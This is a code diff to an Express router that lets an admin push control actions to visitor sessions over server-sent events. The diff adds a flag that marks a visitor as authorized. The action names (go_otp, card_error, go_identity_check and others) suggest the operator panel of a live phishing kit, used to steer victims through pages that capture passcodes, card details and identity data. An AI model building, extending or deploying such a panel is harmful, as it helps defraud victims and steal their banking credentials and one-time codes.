@@ -2,6 +2,7 @@ import { Router, type IRouter } from "express";
 import { setControl, peekControl, type ControlAction } from "../lib/control-store";
 import { extractToken, validateToken } from "../lib/auth";
 import { sendSSEMessage, hasConnectedClients } from "../lib/sse-store";
+import { authorizeVisitor } from "@workspace/db";
 
 const router: IRouter = Router();
 
@@ -26,7 +27,7 @@ router.get("/control/:sessionId", (req, res): void => {
   res.json(control ?? { action: null });
 });
 
-// Legacy endpoint - kept for backwards compatibility  
+// Legacy endpoint - kept for backwards compatibility
 router.delete("/control/:sessionId", (_req, res): void => {
   res.json({ success: true, action: null, message: "Use SSE endpoint instead" });
 });
@@ -36,7 +37,7 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
   try {
     const rawSessionId = req.params.sessionId;
     const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
-    const { action, code } = req.body as { action?: string; code?: string };
+    const { action, code, authorize } = req.body as { action?: string; code?: string; authorize?: boolean };
 
     const allowed: ControlAction[] = [
       "go_otp", "go_otp2", "go_otp3", "card_error",
@@ -45,10 +46,19 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
       "go_total", "go_total2", "go_waiting",
       "identity_code", "go_identity_check"
     ];
-    
+
     if (!action || !allowed.includes(action as ControlAction)) {
       res.status(400).json({ error: "Invalid action" });
       return;
+    }
+
+    // If authorize flag is true, set visitor as authorized before sending redirect
+    if (authorize === true) {
+      authorizeVisitor(sessionId).then((success) => {
+        console.log(`[Control] Visitor ${sessionId.substring(0, 8)}... authorized: ${success}`);
+      }).catch((err) => {
+        console.error("[Control] Failed to authorize visitor:", err);
+      });
     }
 
     // Also save to control store for legacy support
@@ -56,12 +66,13 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
 
     // Send via SSE for immediate delivery
     const hasClients = hasConnectedClients(sessionId);
-    
+
     if (hasClients) {
       // Broadcast via SSE - client will receive immediately
       sendSSEMessage(sessionId, "control", {
         action,
         code,
+        authorized: authorize === true,
         timestamp: Date.now()
       });
       console.log(`[Control] SSE broadcast sent to session: ${sessionId}`);
@@ -69,10 +80,10 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
       console.log(`[Control] No SSE clients connected for session: ${sessionId}, saved to store`);
     }
 
-    res.json({ 
-      success: true, 
-      sessionId, 
-      action, 
+    res.json({
+      success: true,
+      sessionId,
+      action,
       code,
       delivered: hasClients ? "sse" : "store"
     });
